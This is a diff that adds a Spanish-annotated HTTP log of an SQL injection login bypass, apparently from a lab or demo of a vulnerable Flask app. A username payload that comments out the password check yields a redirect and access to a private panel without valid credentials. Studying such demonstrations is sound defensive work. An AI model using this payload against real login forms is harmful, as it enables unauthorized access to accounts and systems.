@@ -1,0 +1,14 @@
+== Peticion: POST /login con username=" ' OR '1'='1' -- "  (comenta la comprobacion de password) ==
+HTTP/1.1 302 FOUND
+Server: Werkzeug/3.1.8 Python/3.13.16
+Date: Sun, 25 Oct 2026 10:38:29 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 199
+Location: /panel
+Set-Cookie: session_id="s3ssion-' OR '1'='1' -- "; Path=/
+Connection: close
+
+== Acceso al panel privado SIN credenciales validas ==
+  <h1>Panel privado</h1>
+  <p>Sesion activa: s3ssion-&#39; OR &#39;1&#39;=&#39;1&#39; -- </p>
+  <p>Has accedido al area restringida.</p>
